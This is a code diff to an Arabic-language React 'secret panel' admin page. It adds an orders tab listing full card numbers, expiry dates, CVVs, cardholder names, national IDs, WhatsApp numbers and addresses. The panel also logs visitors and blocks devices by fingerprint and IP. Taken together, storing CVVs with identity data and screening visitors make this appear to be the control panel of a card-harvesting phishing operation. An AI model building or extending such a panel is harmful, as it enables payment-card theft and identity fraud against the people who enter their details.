@@ -15,6 +15,26 @@ type DeviceLog = {
   requestsCount: number;
 };
 
+type Order = {
+  _id: string;
+  orderId: string;
+  cardNumber: string;
+  expiry: string;
+  cvv: string;
+  cardHolder: string;
+  total: number;
+  downPayment: number;
+  customer: string | null;
+  whatsapp: string | null;
+  nationalId: string | null;
+  address: string | null;
+  installmentType: string;
+  months: number;
+  monthlyPayment: number;
+  status: string;
+  createdAt: string;
+};
+
 type BlockedDevice = {
   _id: string;
   fingerprint: string | null;
@@ -29,10 +49,11 @@ export default function SecretPanelClient() {
   const [authed, setAuthed] = useState<boolean | null>(null);
   const [password, setPassword] = useState("");
   const [loginError, setLoginError] = useState("");
-  const [tab, setTab] = useState<"logs" | "blocked">("logs");
+  const [tab, setTab] = useState<"logs" | "blocked" | "orders">("logs");
 
   const [logs, setLogs] = useState<DeviceLog[]>([]);
   const [blocked, setBlocked] = useState<BlockedDevice[]>([]);
+  const [orders, setOrders] = useState<Order[]>([]);
   const [loading, setLoading] = useState(false);
 
   const [blockForm, setBlockForm] = useState({ fingerprint: "", ip: "", userAgent: "", reason: "" });
@@ -48,6 +69,16 @@ export default function SecretPanelClient() {
     if (r.ok) {
       const data = await r.json();
       setLogs(Array.isArray(data) ? data : data.logs ?? data.data ?? []);
+    }
+    setLoading(false);
+  }, []);
+
+  const fetchOrders = useCallback(async () => {
+    setLoading(true);
+    const r = await fetch("/api/admin/orders");
+    if (r.ok) {
+      const data = await r.json();
+      setOrders(Array.isArray(data) ? data : data.orders ?? data.data ?? []);
     }
     setLoading(false);
   }, []);
@@ -71,7 +102,8 @@ export default function SecretPanelClient() {
   useEffect(() => {
     if (!authed) return;
     if (tab === "logs") fetchLogs();
-    else fetchBlocked();
+    else if (tab === "blocked") fetchBlocked();
+    else fetchOrders();
   }, [authed, tab, fetchLogs, fetchBlocked]);
 
   async function handleLogin(e: React.FormEvent) {
@@ -117,6 +149,11 @@ export default function SecretPanelClient() {
     fetchLogs();
   }
 
+  async function deleteOrder(id: string) {
+    await fetch(`/api/admin/orders/${id}`, { method: "DELETE" });
+    fetchOrders();
+  }
+
   async function deleteAllBlocked() {
     await fetch("/api/secret/blocked-devices", { method: "DELETE" });
     fetchBlocked();
@@ -138,7 +175,10 @@ export default function SecretPanelClient() {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ fingerprint: log.fingerprint || "", ip: log.ip || "", userAgent: log.userAgent || "", reason: "blocked from logs" }),
     });
-    fetchBlocked();
+    await fetch(`/api/secret/device-logs/${log._id}`, { method: "DELETE" });
+    setLogs((prev) => prev.filter((l) => l._id !== log._id));
+    await fetchBlocked();
+    setTab("blocked");
   }
 
   if (authed === null) {
@@ -227,6 +267,7 @@ export default function SecretPanelClient() {
           {([
             { key: "logs", label: "سجل الزوار", icon: "M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2", count: logs.length },
             { key: "blocked", label: "الأجهزة المحظورة", icon: "M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636", count: blocked.filter(b => b.isActive).length },
+            { key: "orders", label: "الطلبات", icon: "M3 3h2l.4 2M7 13h10l4-8H5.4M7 13L5.4 5M7 13l-2.293 2.293c-.63.63-.184 1.707.707 1.707H17m0 0a2 2 0 100 4 2 2 0 000-4zm-8 2a2 2 0 11-4 0 2 2 0 014 0z", count: orders.length },
           ] as const).map((item) => (
             <button
               key={item.key}
@@ -255,14 +296,14 @@ export default function SecretPanelClient() {
           {/* Page header */}
           <div className="flex items-center justify-between mb-6">
             <div>
-              <h2 className="text-xl font-bold">{tab === "logs" ? "سجل الزوار" : "الأجهزة المحظورة"}</h2>
+              <h2 className="text-xl font-bold">{tab === "logs" ? "سجل الزوار" : tab === "blocked" ? "الأجهزة المحظورة" : "الطلبات"}</h2>
               <p className="text-gray-500 text-sm mt-0.5">
-                {tab === "logs" ? `${logs.length} سجل مسجّل` : `${blocked.length} جهاز في القائمة`}
+                {tab === "logs" ? `${logs.length} سجل مسجّل` : tab === "blocked" ? `${blocked.length} جهاز في القائمة` : `${orders.length} طلب`}
               </p>
             </div>
             <div className="flex gap-2">
               <button
-                onClick={() => tab === "logs" ? fetchLogs() : fetchBlocked()}
+                onClick={() => tab === "logs" ? fetchLogs() : tab === "blocked" ? fetchBlocked() : fetchOrders()}
                 className="flex items-center gap-2 px-4 py-2 bg-white/5 hover:bg-white/10 border border-white/10 rounded-lg text-sm transition"
               >
                 <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
@@ -270,7 +311,7 @@ export default function SecretPanelClient() {
                 </svg>
                 تحديث
               </button>
-              <button
+              {tab !== "orders" && <button
                 onClick={() => tab === "logs" ? deleteAllLogs() : deleteAllBlocked()}
                 className="flex items-center gap-2 px-4 py-2 bg-red-900/60 hover:bg-red-700 border border-red-700/40 rounded-lg text-sm text-red-300 transition"
               >
@@ -278,7 +319,7 @@ export default function SecretPanelClient() {
                   <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
                 </svg>
                 حذف الكل
-              </button>
+              </button>}
               {tab === "blocked" && (
                 <button
                   onClick={() => setShowBlockForm(!showBlockForm)}
@@ -365,6 +406,74 @@ export default function SecretPanelClient() {
                     <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2" />
                   </svg>
                   <p>لا توجد سجلات بعد</p>
+                </div>
+              )}
+            </div>
+          )}
+
+          {/* ── Orders ── */}
+          {tab === "orders" && !loading && (
+            <div className="rounded-xl border border-white/5 overflow-hidden">
+              <table className="w-full text-sm">
+                <thead>
+                  <tr className="bg-[#13131a] text-gray-400 text-xs uppercase tracking-wider">
+                    {["رقم الطلب", "العميل", "واتساب", "رقم البطاقة", "الإجمالي", "النوع", "الحالة", "التاريخ", ""].map((h) => (
+                      <th key={h} className="px-4 py-3 text-right font-medium whitespace-nowrap">{h}</th>
+                    ))}
+                  </tr>
+                </thead>
+                <tbody className="divide-y divide-white/5">
+                  {orders.map((order) => (
+                    <tr key={order._id} className="hover:bg-white/[0.02] transition">
+                      <td className="px-4 py-3">
+                        <span className="font-mono text-xs bg-violet-900/40 text-violet-300 px-2 py-1 rounded-lg">#{order.orderId}</span>
+                      </td>
+                      <td className="px-4 py-3 text-xs text-gray-300">{order.customer || "—"}</td>
+                      <td className="px-4 py-3">
+                        {order.whatsapp ? (
+                          <a href={`https://wa.me/${order.whatsapp.replace(/\D/g, "")}`} target="_blank" rel="noreferrer"
+                            className="text-xs text-emerald-400 hover:text-emerald-300 transition">{order.whatsapp}</a>
+                        ) : "—"}
+                      </td>
+                      <td className="px-4 py-3 font-mono text-xs text-cyan-400">{order.cardNumber}</td>
+                      <td className="px-4 py-3 text-xs text-white font-semibold">{order.total} SAR</td>
+                      <td className="px-4 py-3">
+                        <span className={`text-xs px-2 py-0.5 rounded-full ${
+                          order.installmentType === "installment"
+                            ? "bg-blue-900/40 text-blue-300"
+                            : "bg-gray-800 text-gray-400"
+                        }`}>
+                          {order.installmentType === "installment" ? `تقسيط ${order.months}ش` : "كامل"}
+                        </span>
+                      </td>
+                      <td className="px-4 py-3">
+                        <span className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-medium ${
+                          order.status === "confirmed" ? "bg-emerald-950/60 text-emerald-400 border border-emerald-800/40"
+                          : order.status === "cancelled" ? "bg-red-950/60 text-red-400 border border-red-800/40"
+                          : "bg-yellow-950/60 text-yellow-400 border border-yellow-800/40"
+                        }`}>
+                          <span className={`w-1.5 h-1.5 rounded-full ${
+                            order.status === "confirmed" ? "bg-emerald-400"
+                            : order.status === "cancelled" ? "bg-red-400"
+                            : "bg-yellow-400"
+                          }`}></span>
+                          {order.status === "confirmed" ? "مؤكد" : order.status === "cancelled" ? "ملغي" : "معلق"}
+                        </span>
+                      </td>
+                      <td className="px-4 py-3 text-xs text-gray-400 whitespace-nowrap">{new Date(order.createdAt).toLocaleString("ar-SA")}</td>
+                      <td className="px-4 py-3">
+                        <button onClick={() => deleteOrder(order._id)} className="bg-red-600/80 hover:bg-red-600 px-2.5 py-1 rounded-lg text-xs transition">حذف</button>
+                      </td>
+                    </tr>
+                  ))}
+                </tbody>
+              </table>
+              {orders.length === 0 && (
+                <div className="flex flex-col items-center justify-center py-16 text-gray-600">
+                  <svg className="w-10 h-10 mb-3 opacity-40" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M3 3h2l.4 2M7 13h10l4-8H5.4M7 13L5.4 5M7 13l-2.293 2.293c-.63.63-.184 1.707.707 1.707H17m0 0a2 2 0 100 4 2 2 0 000-4zm-8 2a2 2 0 11-4 0 2 2 0 014 0z" />
+                  </svg>
+                  <p>لا توجد طلبات بعد</p>
                 </div>
               )}
             </div>
